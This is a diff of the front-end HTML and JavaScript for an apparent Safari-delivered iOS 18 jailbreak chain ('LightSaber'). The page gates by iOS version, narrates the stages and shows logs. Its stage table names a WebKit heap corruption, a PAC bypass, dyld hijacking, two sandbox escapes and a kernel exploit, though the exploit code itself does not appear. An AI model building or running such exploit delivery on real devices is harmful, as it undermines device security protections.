+          <div class="expectation-row"><span class="expectation-badge">✓</span><span class="expectation-copy"><strong>Safari crashes to home screen:</strong> good signal &mdash; tweaks about to install.</span></div>
+          <div class="expectation-row"><span class="expectation-badge">✓</span><span class="expectation-copy"><strong>Wait 10&ndash;20 seconds:</strong> then check the home screen.</span></div>
+        </div>
+      </div>
       <div class="dialog-btns">
         <button class="btn-cancel" onclick="dismissConfirm()">Cancel</button>
         <button class="btn-confirm" onclick="proceedInstall()">Proceed</button>
@@ -1269,11 +1917,27 @@
   <div id="killSafariOverlay" class="overlay">
     <div class="dialog">
       <h2 style="color:#b91c1c">Force-close Safari</h2>
-      <p id="killSafariMessage">Safari got corrupted during a recent chain run. Reusing the same userland process can make the next attempt much less reproducible. From the app switcher, swipe up on Safari to kill the process, then reopen and try again.</p>
+      <p>Safari is in a dirty state from a previous run. From the app switcher, swipe up on Safari to kill it, then reopen this page and try again.</p>
+      <p style="font-size:0.78rem;color:var(--subtle);margin-top:8px">If this keeps happening, clear Safari's cache (Settings &rarr; Apps &rarr; Safari &rarr; Clear History and Website Data) and/or reboot your device before retrying. A reboot gives you a fresh kernel state and the cleanest chance of success.</p>
       <div class="dialog-btns">
         <button class="btn-confirm" onclick="dismissKillSafari()">Got it</button>
       </div>
     </div>
+  </div>
+
+  <div id="bookmarkPrompt" class="bookmark-prompt" role="dialog" aria-labelledby="bookmarkPromptTitle">
+    <div class="bookmark-prompt-icon" aria-hidden="true">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 3v12"/>
+        <path d="M8 7l4-4 4 4"/>
+        <path d="M5 14v5a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-5"/>
+      </svg>
+    </div>
+    <div class="bookmark-prompt-body">
+      <div class="bookmark-prompt-title" id="bookmarkPromptTitle">Add to Home Screen</div>
+      <div class="bookmark-prompt-text">A successful exploit deletes LightSaber&rsquo;s Safari cache &mdash; only this site, not your other history or cache. Tap <strong>Share &rarr; Add to Home Screen</strong> so you can reopen it afterwards.</div>
+    </div>
+    <button type="button" class="bookmark-prompt-close" onclick="dismissBookmarkPrompt()" aria-label="Dismiss">&times;</button>
   </div>
 
   <script>
@@ -1294,20 +1958,43 @@
     // localStorage so it survives Safari kills + device reboots and only
     // comes back if the user fully clears Safari's website data / cache.
     // sessionStorage would re-prompt on every Safari kill, which got annoying.
-    // Intro overlay disabled for test page
-    // (function() {
-    //   var dismissed = false;
-    //   try { dismissed = localStorage.getItem('ls_intro_dismissed') === '1'; } catch(e) {}
-    //   if (!dismissed) {
-    //     var el = document.getElementById('introOverlay');
-    //     if (el) el.className = 'overlay active';
-    //   }
-    // })();
+    (function() {
+      var dismissed = false;
+      try { dismissed = localStorage.getItem('ls_intro_dismissed') === '1'; } catch(e) {}
+      if (!dismissed) {
+        var el = document.getElementById('introOverlay');
+        if (el) el.className = 'overlay active';
+      } else {
+        // Intro already cleared — slide the bookmark prompt in shortly after
+        // first paint so it's not the first thing the user sees on load.
+        setTimeout(maybeShowBookmarkPrompt, 900);
+      }
+    })();
     function dismissIntro() {
       try { localStorage.setItem('ls_intro_dismissed', '1'); } catch(e) {}
       var el = document.getElementById('introOverlay');
       if (el) el.className = 'overlay';
       window.scrollTo(0, 0);
+      // Show the Add-to-Home-Screen prompt right after the intro clears so
+      // the next thing the user sees is the bookmark suggestion.
+      setTimeout(maybeShowBookmarkPrompt, 350);
+    }
+    // Bookmark prompt: only relevant on iOS Safari, never when running
+    // standalone (already added to home screen), and never after dismissal.
+    function maybeShowBookmarkPrompt() {
+      var el = document.getElementById('bookmarkPrompt');
+      if (!el) return;
+      if (!/iPhone|iPad|iPod/.test(navigator.userAgent)) return;
+      if (window.navigator && window.navigator.standalone) return;
+      try {
+        if (localStorage.getItem('ls_bookmark_dismissed') === '1') return;
+      } catch (e) {}
+      el.classList.add('visible');
+    }
+    function dismissBookmarkPrompt() {
+      try { localStorage.setItem('ls_bookmark_dismissed', '1'); } catch (e) {}
+      var el = document.getElementById('bookmarkPrompt');
+      if (el) el.classList.remove('visible');
     }
     var ua = navigator.userAgent;
     var iosMatch = /iPhone OS ([0-9_]+)/g.exec(ua);
@@ -1316,237 +2003,385 @@
     var major = iosParts[0], minor = iosParts[1], patch = iosParts[2] || 0;
     var isIphone = /iPhone/.test(ua);
     var doneSignal = false;
-    var syslogPollTimer = null;
-    var lastSyslogText = '';
-    var seenDeviceLines = {};
-    var syslogCandidates = ['syslog.txt', '../syslog.txt', '/syslog.txt', '/BrokenBlade/syslog.txt'];
-    var activeSyslogPath = null;
-    var LOG_STORE_KEY = 'bb_last_log_lines_v1';
-    var LOG_ACTIVE_KEY = 'bb_last_run_active_v1';
-    var LOG_STORE_LIMIT = 240;
-    var USERLAND_DIRTY_KEY = 'bb_userland_dirty_v1';
-    var BUILD_VERSION_LABEL = 'v0.0.100';
-    var BUILD_TIMESTAMP_LABEL = '2026-05-01 01:45 EDT';
-    var BUILD_COMMIT_API = 'https://api.github.com/repos/zeroxjf/BrokenBlade/commits/main';
+    var logWatchdog = null;
+    var lastLogTime = 0;
+    var lastLogText = '';
+    var watchdogTicks = 0;
+    var currentStage = '';
+    var currentStageName = '';
+    var RAW_LOG_STORE_KEY = 'ls_raw_log_lines_v1';
+    var RAW_LOG_ACTIVE_KEY = 'ls_raw_log_active_v1';
+    var RAW_LOG_STORE_LIMIT = 260;
+    // Sticky-bottom behavior: autoscroll on each new line ONLY while the
+    // user is already pinned at (or near) the bottom of the scroll. As soon
+    // as they scroll up to read history, autoscroll pauses so we don't
+    // fight their input — otherwise every new line yanks them back to
+    // bottom and old lines look like they "go blank" because the scroll
+    // jumps before the eye can track them.
+    var rawLogStickyBottom = true;
+    // Maps raw log patterns to user-friendly stage descriptions.
+    // Order matters: first match wins. 'log' = message shown in scrolling log (omit to skip).
+    // phase: 1 Setup, 2 WebKit, 3 Kernel, 4 Cleanup, 5 Apply.
+    // expected: pops the yellow callout for counter-intuitive moments
+    // (freeze / cache-clean / Safari-kill) where the user might think the
+    // chain broke when it's actually progressing.
+    // hit: ticks the matching numbered row in #runExpectations.
+    var stageRules = [
+      { match: 'Loading worker code',   stage: 'load',  phase: 1, name: 'Downloading exploit code',        sub: 'Fetching worker scripts from server',                  log: 'Preparing payload...' },
+      { match: 'Worker created',        stage: 'init',  phase: 1, name: 'Initializing WebKit exploit',     sub: 'Web worker started',                                   log: 'Spawned exploit worker inside WebKit' },
+      { match: 'RCE module ready',      stage: 'init',  phase: 1, name: 'Exploit module ready',            sub: '',                                                     log: 'Exploit module armed' },
+      { match: 'inside stage1',         stage: 'rce1',  phase: 2, name: 'Running WebKit exploit',          sub: 'Corrupting JSC heap objects',                          log: 'Triggering JavaScriptCore vulnerability...' },
+      { match: 'Finished prims',        stage: 'rce1',  phase: 2, name: 'WebKit exploit primitives ready',  sub: 'Read/write access established',                       log: 'Got arbitrary read/write inside WebContent process' },
+      { match: 'Inside stage2',         stage: 'rce2',  phase: 2, name: 'Running WebKit exploit',          sub: 'Building full exploit primitives',                     log: 'Building kernel exploit primitives...' },
+      { match: 'RCE success',           stage: 'rce2',  phase: 2, name: 'Code execution achieved',         sub: 'Moving to next stage',                                 log: 'Full code execution inside Safari' },
+      { match: 'check_dlopen',          stage: 'dyld',  phase: 2, name: 'Loading system libraries',        sub: 'Hijacking dyld to load frameworks',                    log: 'Hijacking dyld to load system frameworks...' },
+      { match: 'sign_pointers',         stage: 'dyld',  phase: 2, name: 'Signing function pointers',       sub: 'Bypassing pointer authentication (PAC)',               log: 'Bypassing pointer authentication...' },
+      {
+        match: 'inside setup_fcall',
+        stage: 'fcall',
+        phase: 2,
+        hit: 1,
+        expected: '<strong>Safari will freeze, then crash to the home screen after about 45&ndash;60 seconds.</strong> That is the good signal &mdash; wait 10&ndash;20 seconds after the crash.',
+        name: 'Exploit chain handed off',
+        sub: 'WebKit handed off to native code',
+        log: 'freeze'
+      },
+      { match: '[+] SBX0 complete',                         stage: 'sbx0',        phase: 3, name: 'First sandbox escape complete', sub: 'Preparing SBX1 handoff',                         log: 'SBX0 complete; moving deeper into the chain', logCls: 'ok' },
+      { match: 'Stage 5 started',                           stage: 'sbx1',        phase: 3, name: 'Second sandbox escape running', sub: 'Escalating into the PE launch path',               log: 'SBX1 started' },
+      { match: 'sbx1sbx1 returning success',                stage: 'sbx1-done',   phase: 3, name: 'Second sandbox escape complete', sub: 'Spawning PE in mediaplaybackd',                  log: 'SBX1 complete; spawning PE', logCls: 'ok' },
+      { match: 'Executing pe_main.js',                       stage: 'pe-spawn',    phase: 3, name: 'Kernel phase starting', sub: 'PE payload scheduled in mediaplaybackd',                 log: 'PE payload scheduled' },
+      { match: '[PE-DBG] pe_main entry',                     stage: 'pe-entry',    phase: 3, name: 'PE is alive', sub: 'mediaplaybackd is now logging the kernel phase',                 log: 'PE syslog entry received', logCls: 'ok' },
+      { match: '[PE] Calling pe() - kernel exploit phase',   stage: 'pe-kernel',   phase: 3, hit: 2, name: 'Kernel exploit running', sub: 'This is usually the quiet part of the chain',  log: 'Kernel phase running; total run is about 1 minute' },
+      { match: '[+] PE start() called',                      stage: 'post-pe',     phase: 3, name: 'Post-PE reached', sub: 'Kernel primitive succeeded; applying selected actions',       log: 'Post-PE reached', logCls: 'ok' },
+      {
+        match: '[SAFARI-CLEAN] audit start',
+        stage: 'safari-clean',
+        phase: 4,
+        hit: 3,
+        expected: '<strong>Almost there.</strong> Post-kernel cleanup phase reached &mdash; Safari is about to crash to the home screen. That is the good sign.',
+        name: 'Post-PE cleanup phase',
+        sub: 'Safari is about to crash to the home screen'
+      },
+      { match: '[SAFARI-CLEAN] audit done',                  stage: 'safari-clean-done', phase: 4, name: 'Cleanup phase complete', sub: 'Chain is on the install step' },
+      {
+        match: '[SAFARI-CLEAN] safari-kill done',
+        stage: 'safari-kill',
+        phase: 4,
+        hit: 4,
+        expected: '<strong>Safari just crashed to the home screen.</strong> That is the good sign &mdash; tweaks are about to install. Just wait 10&ndash;20 seconds.',
+        name: 'Crashed to home screen',
+        sub: 'Just wait 5\u201310 seconds'
+      },
+      { match: 'SBCustomizer JS inject result: true',        stage: 'springboard', phase: 5, name: 'SpringBoard changes applied', sub: 'Home screen tweak injection succeeded',           log: 'SpringBoard customization applied', logCls: 'ok' },
+      { match: '[PE] start() completed successfully',        stage: 'done',        phase: 5, name: 'Install complete', sub: 'All selected stages finished',                              log: 'PE reported full completion', logCls: 'ok' },
+    ];
 
-    (function applyBuildBackground() {
-      var root = document.documentElement;
-      var versionEl = document.getElementById('versionMarker');
-      var timestampEl = document.getElementById('buildTimestamp');
-      function hashString(text) {
-        var hash = 2166136261;
-        text = String(text || BUILD_VERSION_LABEL);
-        for (var i = 0; i < text.length; i++) {
-          hash ^= text.charCodeAt(i);
-          hash = Math.imul(hash, 16777619);
-        }
-        return hash >>> 0;
-      }
-      function formatBuildTimestamp(value) {
-        var d = value ? new Date(value) : null;
-        if (!d || isNaN(d.getTime())) return BUILD_TIMESTAMP_LABEL;
-        try {
-          return d.toLocaleString(undefined, {
-            year: 'numeric',
-            month: '2-digit',
-            day: '2-digit',
-            hour: '2-digit',
-            minute: '2-digit',
-            hour12: false,
-            timeZoneName: 'short'
-          });
-        } catch (e) {
-          return BUILD_TIMESTAMP_LABEL;
-        }
-      }
-      function setBuildColor(buildId, label, timestampLabel, timestampDate) {
-        var hash = hashString(buildId);
-        var hue = hash % 360;
-        var bg = 'hsl(' + hue + ' 78% 92%)';
-        var marker = 'hsl(' + hue + ' 82% 44%)';
-        var banner = 'hsl(' + hue + ' 72% 38%)';
-        var bannerLink = 'hsl(' + ((hue + 55) % 360) + ' 95% 84%)';
-        var grad = 'radial-gradient(1200px 700px at 50% -220px, hsl(' + hue + ' 88% 52% / 0.22), transparent 62%)';
-        root.style.setProperty('--bg', bg);
-        root.style.setProperty('--bg-grad', grad);
-        root.style.setProperty('--version-marker', marker);
-        root.style.setProperty('--build-banner', banner);
-        root.style.setProperty('--build-banner-link', bannerLink);
-        if (versionEl) versionEl.textContent = label;
-        if (timestampEl) {
-          timestampEl.textContent = timestampLabel || BUILD_TIMESTAMP_LABEL;
-          if (timestampDate) timestampEl.setAttribute('datetime', timestampDate);
+    function updateStage(text) {
+      if (!text) return;
+      for (var i = 0; i < stageRules.length; i++) {
+        if (text.indexOf(stageRules[i].match) !== -1) {
+          var rule = stageRules[i];
+          if (rule.stage === currentStage && rule.name === currentStageName) return;
+          currentStage = rule.stage;
+          currentStageName = rule.name;
+          var stageBanner = document.getElementById('logStageBanner');
+          var stageText = document.getElementById('logStageText');
+          var stageSub = document.getElementById('logStageSub');
+          if (stageText) stageText.textContent = rule.name;
+          if (stageSub) stageSub.textContent = rule.sub;
+          if (stageBanner) {
+            stageBanner.classList.remove('err');
+            stageBanner.classList.toggle('done', rule.stage === 'done');
+          }
+          if (rule.phase) setPhase(rule.phase);
+          if (rule.expected) setExpectedCallout(rule.expected, rule.phase);
+          if (rule.hit) hitExpectation(rule.hit);
+          if (rule.stage === 'done') markAllPhasesDone();
+          // fcall is the WebKit→native handoff: parent main thread is about
+          // to freeze with the iframe. Flip the strip into freeze-imminent
+          // mode so phases 3–5 visibly look queued (amber, staggered pulse)
+          // instead of inert gray during the freeze the user is about to
+          // see. Done synchronously here so it lands in the brief paint
+          // window before WebKit actually pauses.
+          if (rule.stage === 'fcall') markFreezeImminent();
+          return;
         }
       }
-      setBuildColor(BUILD_VERSION_LABEL, BUILD_VERSION_LABEL, BUILD_TIMESTAMP_LABEL, '2026-05-01T01:45:43-04:00');
-      if (!window.fetch) return;
-      fetch(BUILD_COMMIT_API + '?_=' + Date.now(), { cache: 'no-store' })
-        .then(function(response) {
-          if (!response.ok) throw new Error('commit lookup failed');
-          return response.json();
-        })
-        .then(function(data) {
-          if (!data || !data.sha) return;
-          var commitDate = data.commit && data.commit.committer && data.commit.committer.date;
-          setBuildColor(data.sha, BUILD_VERSION_LABEL + ' · main ' + data.sha.slice(0, 7), formatBuildTimestamp(commitDate), commitDate);
-        })
-        .catch(function() {});
-    })();
+    }
 
-    function logStoreLine(text, cls) {
+    function setStageError(msg) {
+      var stageBanner = document.getElementById('logStageBanner');
+      var stageText = document.getElementById('logStageText');
+      var stageSub = document.getElementById('logStageSub');
+      if (stageBanner) {
+        stageBanner.classList.remove('done');
+        stageBanner.classList.add('err');
+      }
+      if (stageText) stageText.textContent = msg || 'Something went wrong';
+      if (stageSub) stageSub.textContent = 'Check the log below for details';
+      markPhaseError();
+      clearExpectedCallout();
+    }
+
+    var currentPhase = 0;
+    var currentExpectedPhase = 0;
+
+    function setPhase(phase) {
+      if (!phase || phase < 1 || phase > 5) return;
+      if (phase < currentPhase) return;
+      for (var p = 1; p < phase; p++) {
+        var done = document.querySelector('.log-phase[data-phase="' + p + '"]');
+        if (done) done.className = 'log-phase done';
+      }
+      var active = document.querySelector('.log-phase[data-phase="' + phase + '"]');
+      if (active) active.className = 'log-phase active';
+      currentPhase = phase;
+      if (currentExpectedPhase && phase > currentExpectedPhase) clearExpectedCallout();
+    }
+
+    function markAllPhasesDone() {
+      for (var p = 1; p <= 5; p++) {
+        var el = document.querySelector('.log-phase[data-phase="' + p + '"]');
+        if (el) el.className = 'log-phase done';
+      }
+      var strip = document.getElementById('logPhaseStrip');
+      if (strip) strip.classList.remove('is-frozen');
+      currentPhase = 5;
+      clearExpectedCallout();
+    }
+
+    function markPhaseError() {
+      if (!currentPhase) return;
+      var el = document.querySelector('.log-phase[data-phase="' + currentPhase + '"]');
+      if (el) el.className = 'log-phase err';
+      var strip = document.getElementById('logPhaseStrip');
+      if (strip) strip.classList.remove('is-frozen');
+    }
+
+    // text is markup from stageRules (trusted), not user input.
+    function setExpectedCallout(html, phase) {
+      var box = document.getElementById('logExpectedCallout');
+      var t = document.getElementById('logExpectedCalloutText');
+      if (!box || !t) return;
+      t.innerHTML = html;
+      box.classList.add('visible');
+      currentExpectedPhase = phase || currentPhase || 0;
+    }
+
+    function clearExpectedCallout() {
+      var box = document.getElementById('logExpectedCallout');
+      if (box) box.classList.remove('visible');
+      currentExpectedPhase = 0;
+    }
+
+    function hitExpectation(idx) {
+      if (!idx) return;
+      var row = document.querySelector('.expectation-row[data-expectation="' + idx + '"]');
+      if (!row || row.classList.contains('hit')) return;
+      row.classList.add('hit');
+      var badge = row.querySelector('.expectation-badge');
+      if (badge) badge.textContent = '✓';
+    }
+
+    function resetExpectations() {
+      var rows = document.querySelectorAll('.expectation-row[data-expectation]');
+      for (var i = 0; i < rows.length; i++) {
+        rows[i].classList.remove('hit');
+        var badge = rows[i].querySelector('.expectation-badge');
+        var n = rows[i].getAttribute('data-expectation');
+        if (badge && n) badge.textContent = n;
+      }
+    }
+
+    function resetPhases() {
+      for (var p = 1; p <= 5; p++) {
+        var el = document.querySelector('.log-phase[data-phase="' + p + '"]');
+        if (el) el.className = 'log-phase';
+      }
+      var strip = document.getElementById('logPhaseStrip');
+      if (strip) strip.classList.remove('is-frozen');
+      currentPhase = 0;
+      clearExpectedCallout();
+    }
+
+    function markFreezeImminent() {
+      var strip = document.getElementById('logPhaseStrip');
+      if (strip) strip.classList.add('is-frozen');
+    }
+
+    function startLogWatchdog() {
+      stopLogWatchdog();
+      lastLogTime = Date.now();
+      lastLogText = '';
+      watchdogTicks = 0;
+      logWatchdog = setInterval(function() {
+        if (doneSignal) { stopLogWatchdog(); return; }
+        // Don't show watchdog hints once the freeze countdown is active
+        if (currentStage === 'fcall') return;
+        var elapsed = ((Date.now() - lastLogTime) / 1000) | 0;
+        if (elapsed < 10) { watchdogTicks = 0; return; }
+        watchdogTicks++;
+        var hint = '';
+        if (watchdogTicks === 1) {
+          hint = 'Waiting on "' + currentStageName + '" (' + elapsed + 's) \u2014 this step can be slow';
+        } else if (watchdogTicks === 3) {
+          hint = 'Still working on "' + currentStageName + '" (' + elapsed + 's)';
+        } else if (watchdogTicks >= 5 && watchdogTicks % 3 === 0) {
+          hint = 'No progress for ' + elapsed + 's. If this persists, force-quit Safari and retry.';
+        }
+        if (hint) logAppend(hint, 'device');
+      }, 5000);
+    }
+
+    function stopLogWatchdog() {
+      if (logWatchdog) { clearInterval(logWatchdog); logWatchdog = null; }
+    }
+
+    // Bring the consolidated WebContent log card precisely to the top of the
+    // viewport so the user lands on it the moment the chain starts. Using
+    // getBoundingClientRect + window.scrollTo lets us aim the card to a
+    // small breathing-room offset (12px) instead of sticking it flush to
+    // the URL bar, and avoids the "nearest" heuristic that previously
+    // sometimes left the card mostly off-screen.
+    function scrollToLog() {
+      var sheet = document.getElementById('logSheet');
+      if (!sheet) return;
+      var rect = sheet.getBoundingClientRect();
+      var target = (window.pageYOffset || window.scrollY || 0) + rect.top - 12;
       try {
-        if (localStorage.getItem(LOG_ACTIVE_KEY) !== '1') return;
-        var lines = JSON.parse(localStorage.getItem(LOG_STORE_KEY) || '[]');
-        if (!lines || typeof lines.length !== 'number') lines = [];
-        lines.push({ text: String(text), cls: cls || '' });
-        if (lines.length > LOG_STORE_LIMIT) lines = lines.slice(lines.length - LOG_STORE_LIMIT);
-        localStorage.setItem(LOG_STORE_KEY, JSON.stringify(lines));
-      } catch (e) {}
+        window.scrollTo({ top: target, behavior: 'smooth' });
+      } catch (e) {
+        window.scrollTo(0, target);
+      }
+      var scroll = document.getElementById('rawLogScroll');
+      if (scroll) scroll.scrollTop = scroll.scrollHeight;
     }
+    // Legacy entry points kept for any inline callers in this file.
+    function openLogSheet()  { scrollToLog(); }
+    function closeLogSheet() { scrollToLog(); }
 
-    function logAppend(text, cls, skipStore) {
-      var el = document.getElementById('logScroll');
-      if (!el) return;
-      var line = document.createElement('div');
-      line.className = 'log-line' + (cls ? ' ' + cls : '');
-      line.textContent = text;
-      el.appendChild(line);
-      el.scrollTop = el.scrollHeight;
-      if (!skipStore) logStoreLine(text, cls);
-    }
-
-    function classifyLogLine(text) {
-      var msg = (text || '').toLowerCase();
-      if (msg.indexOf('mediaplaybackd') !== -1 || msg.indexOf('[pe]') !== -1 || msg.indexOf('pe-dbg') !== -1) return 'pe';
-      if (msg.indexOf('springboard') !== -1 || msg.indexOf('[fiveicon]') !== -1 || msg.indexOf('injectjs') !== -1) return 'springboard';
-      if (msg.indexOf('kernel') !== -1 || msg.indexOf('sbx0:') !== -1 || msg.indexOf('sbx1:') !== -1 || msg.indexOf('[mpd]') !== -1 || msg.indexOf('[profiler]') !== -1) return 'kernel';
-      if (msg.indexOf('webcontent') !== -1 || msg.indexOf('[msg]') !== -1) return 'device';
+    function classifyRawLogLine(text) {
+      var msg = String(text || '').toLowerCase();
+      if (msg.indexOf('safari-clean') !== -1 || msg.indexOf('[pe]') !== -1 || msg.indexOf('[pe-dbg]') !== -1 || msg.indexOf('mediaplaybackd') !== -1) return 'pe';
+      if (msg.indexOf('springboard') !== -1 || msg.indexOf('[sbc]') !== -1 || msg.indexOf('sbcustomizer') !== -1 || msg.indexOf('injectjs') !== -1) return 'springboard';
+      if (msg.indexOf('sbx0:') !== -1 || msg.indexOf('sbx1:') !== -1 || msg.indexOf('[mpd]') !== -1 || msg.indexOf('[profiler]') !== -1 || msg.indexOf('kernel') !== -1) return 'kernel';
+      if (msg.indexOf('error') !== -1 || msg.indexOf('exception') !== -1 || msg.indexOf('failed') !== -1) return 'err';
+      if (msg.indexOf('[ui]') !== -1 || msg.indexOf('worker') !== -1 || msg.indexOf('webcontent') !== -1) return 'device';
       return '';
     }
 
-    function appendSyslogText(fullText) {
-      if (!fullText) return;
-      var lines = fullText.split(/\r?\n/);
-      for (var i = 0; i < lines.length; i++) {
-        var line = lines[i];
-        if (!line) continue;
-        if (seenDeviceLines[line]) continue;
-        seenDeviceLines[line] = 1;
-        logAppend(line, classifyLogLine(line));
-      }
+    function rawLogStoreLine(text, cls) {
+      try {
+        if (localStorage.getItem(RAW_LOG_ACTIVE_KEY) !== '1') return;
+        var lines = JSON.parse(localStorage.getItem(RAW_LOG_STORE_KEY) || '[]');
+        if (!lines || typeof lines.length !== 'number') lines = [];
+        lines.push({ text: String(text), cls: cls || '' });
+        if (lines.length > RAW_LOG_STORE_LIMIT) lines = lines.slice(lines.length - RAW_LOG_STORE_LIMIT);
+        localStorage.setItem(RAW_LOG_STORE_KEY, JSON.stringify(lines));
+      } catch (e) {}
     }
 
-    function handleSyslogResponse(path, text) {
-      if (!text) return false;
-      if (!activeSyslogPath) {
-        activeSyslogPath = path;
-        logAppend('[UI] Using syslog source: ' + path, 'device');
-      }
-      if (text === lastSyslogText) return true;
-      if (!lastSyslogText || text.indexOf(lastSyslogText) !== 0) {
-        appendSyslogText(text);
-      } else {
-        appendSyslogText(text.slice(lastSyslogText.length));
-      }
-      lastSyslogText = text;
-      return true;
-    }
-
-    function tryPollSyslogAt(index) {
-      if (index >= syslogCandidates.length) return;
-      var path = syslogCandidates[index];
-      var xhr = new XMLHttpRequest();
-      xhr.open('GET', path + '?' + Date.now(), true);
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState !== 4) return;
-        if (xhr.status >= 200 && xhr.status < 300) {
-          var text = xhr.responseText || '';
-          if (handleSyslogResponse(path, text)) return;
-        }
-        if (!activeSyslogPath) tryPollSyslogAt(index + 1);
+    var rawLogScrollPending = false;
+    function scheduleRawLogScrollToBottom() {
+      if (rawLogScrollPending) return;
+      rawLogScrollPending = true;
+      var run = function() {
+        rawLogScrollPending = false;
+        if (!rawLogStickyBottom) return;
+        var el2 = document.getElementById('rawLogScroll');
+        if (el2) el2.scrollTop = el2.scrollHeight;
       };
-      try { xhr.send(null); } catch (e) {
-        if (!activeSyslogPath) tryPollSyslogAt(index + 1);
+      if (typeof requestAnimationFrame === 'function') requestAnimationFrame(run);
+      else setTimeout(run, 16);
+    }
+
+    function rawLogAppend(text, cls, skipStore) {
+      var el = document.getElementById('rawLogScroll');
+      if (!el) return;
+      // Drop empty / whitespace-only messages so we never inject a blank
+      // div into the scroll. Some iframe paths emit zero-length entries
+      // when a stage has nothing to print, and those rendered as
+      // 2px-tall blanks that the user read as "blank lines on scroll".
+      var s = (text == null) ? '' : String(text);
+      if (!s.replace(/\s+/g, '').length) return;
+      var empty = document.getElementById('rawLogEmpty');
+      if (empty && empty.parentNode) empty.parentNode.removeChild(empty);
+      var line = document.createElement('div');
+      line.className = 'raw-log-line' + (cls ? ' ' + cls : '');
+      line.textContent = s;
+      el.appendChild(line);
+      // Batch scroll-to-bottom into a single rAF callback so a burst of
+      // lines doesn't thrash scrollTop on every append.
+      if (rawLogStickyBottom) scheduleRawLogScrollToBottom();
+      if (!skipStore) rawLogStoreLine(s, cls);
+    }
+
+    // Watch the scroll position so manual scroll-up disables autoscroll
+    // and scrolling back near the bottom re-enables it.
+    (function attachRawLogScrollTracker() {
+      var el = document.getElementById('rawLogScroll');
+      if (!el) return;
+      el.addEventListener('scroll', function() {
+        var dist = el.scrollHeight - el.scrollTop - el.clientHeight;
+        rawLogStickyBottom = dist < 30;
+      }, { passive: true });
+    })();
+
+    function clearRawLogView(keepActive) {
+      var el = document.getElementById('rawLogScroll');
+      if (el) {
+        el.innerHTML = '<div class="raw-log-empty" id="rawLogEmpty">WebContent log lines will appear here when a run starts.</div>';
       }
-    }
-
-    function pollSyslog() {
-      if (activeSyslogPath) {
-        tryPollSyslogAt(syslogCandidates.indexOf(activeSyslogPath) >= 0 ? syslogCandidates.indexOf(activeSyslogPath) : 0);
-      } else {
-        tryPollSyslogAt(0);
-      }
-    }
-
-    function startSyslogPolling() {
-      stopSyslogPolling();
-      lastSyslogText = '';
-      seenDeviceLines = {};
-      activeSyslogPath = null;
-      pollSyslog();
-      syslogPollTimer = setInterval(pollSyslog, 1000);
-    }
-
-    function stopSyslogPolling() {
-      if (syslogPollTimer) {
-        clearInterval(syslogPollTimer);
-        syslogPollTimer = null;
-      }
-    }
-
-    function showLogView() {
-      var lb = document.getElementById('logBox');
-      if (lb) lb.className = 'active';
-    }
-
-    function hideLogView() {
-      var lb = document.getElementById('logBox');
-      if (lb) lb.className = '';
-    }
-
-    function clearLogView() {
-      var el = document.getElementById('logScroll');
-      if (el) el.innerHTML = '';
+      rawLogStickyBottom = true;
       try {
-        localStorage.removeItem(LOG_STORE_KEY);
-        localStorage.removeItem(LOG_ACTIVE_KEY);
+        localStorage.removeItem(RAW_LOG_STORE_KEY);
+        if (!keepActive) localStorage.removeItem(RAW_LOG_ACTIVE_KEY);
       } catch (e) {}
     }
 
-    function restorePreviousLogView() {
+    function restoreRawLogView() {
       try {
-        if (localStorage.getItem(LOG_ACTIVE_KEY) !== '1') return;
-        var lines = JSON.parse(localStorage.getItem(LOG_STORE_KEY) || '[]');
+        if (localStorage.getItem(RAW_LOG_ACTIVE_KEY) !== '1') return;
+        var lines = JSON.parse(localStorage.getItem(RAW_LOG_STORE_KEY) || '[]');
         if (!lines || !lines.length) return;
-        showLogView();
-        logAppend('[UI] Previous run was interrupted. Last persisted WebContent log follows:', 'device', true);
+        rawLogAppend('[UI] Previous run was interrupted. Last WebContent log follows:', 'device', true);
         for (var i = 0; i < lines.length; i++) {
-          logAppend(lines[i].text, lines[i].cls || '', true);
+          rawLogAppend(lines[i].text, lines[i].cls || '', true);
         }
       } catch (e) {}
     }
-    restorePreviousLogView();
+
+    // Thin wrapper so existing UI-event callers ("Starting install with…",
+    // markDone / markFailed banners, watchdog hints, error promotions) land
+    // in the same WebContent log stream as the raw iframe messages, with a
+    // [UI] prefix to distinguish them from the iframe's own [Xms] entries.
+    function logAppend(text, cls) {
+      rawLogAppend('[UI] ' + text, cls || classifyRawLogLine(text));
+    }
+
+    restoreRawLogView();
 
     var supportMsg = document.getElementById('supportMsg');
     var canRun = false;
 
     var supportText = '';
-    var supportClass = '';
+    var supportColor = '';
     if (!isIphone) {
-      supportClass = 'unsupported';
-      supportText = 'iPhone only.';
+      supportColor = '#b91c1c';
+      supportText = 'Not an iPhone';
     } else if (major < 18 || (major === 18 && minor < 4)) {
-      supportClass = 'unsupported';
-      supportText = 'iOS ' + iosVer + ' is not supported.';
+      supportColor = '#b91c1c';
+      supportText = 'iOS ' + iosVer + ' \u2014 not supported';
     } else if (major === 18 && minor >= 4 && (minor < 6 || (minor === 6 && patch <= 2))) {
-      supportClass = 'supported';
-      supportText = 'iOS ' + iosVer;
+      supportColor = '#15803d';
+      supportText = 'iOS ' + iosVer + ' \u2014 supported';
       canRun = true;
     } else {
-      supportClass = 'unsupported';
-      supportText = 'iOS ' + iosVer + ' is not yet supported.';
+      supportColor = '#b91c1c';
+      supportText = 'iOS ' + iosVer + ' \u2014 not yet supported';
     }
-    supportMsg.className = supportClass;
+    supportMsg.style.color = supportColor;
+    supportMsg.style.fontWeight = '600';
     supportMsg.textContent = supportText;
 
     var runBtn = document.getElementById('runBtn');
@@ -1565,7 +2400,8 @@
     var tweakRows = [
       { rowId: 'tweakRowFiveicon', cbId: 'tweakFiveicon', name: 'fiveicon' },
       { rowId: 'tweakRowPowercuff', cbId: 'tweakPowercuff', name: 'powercuff' },
-      { rowId: 'tweakRowThreeapp', cbId: 'tweakThreeapp', name: 'threeapp' }
+      { rowId: 'tweakRowMgpatcher', cbId: 'tweakMgpatcher', name: 'mgpatcher' },
+      { rowId: 'tweakRowApplimit', cbId: 'tweakApplimit', name: 'applimit' }
     ];
     function syncTweakRow(row) {
       var el = document.getElementById(row.rowId);
@@ -1573,19 +2409,87 @@
       if (!el || !cb) return;
       if (cb.checked) el.classList.add('checked');
       else el.classList.remove('checked');
-    }
-    function toggleTweakDetail(rowId) {
-      var el = document.getElementById(rowId);
-      if (!el) return;
-      var expanded = el.classList.toggle('expanded');
-      var detail = el.querySelector('.tweak-row-detail');
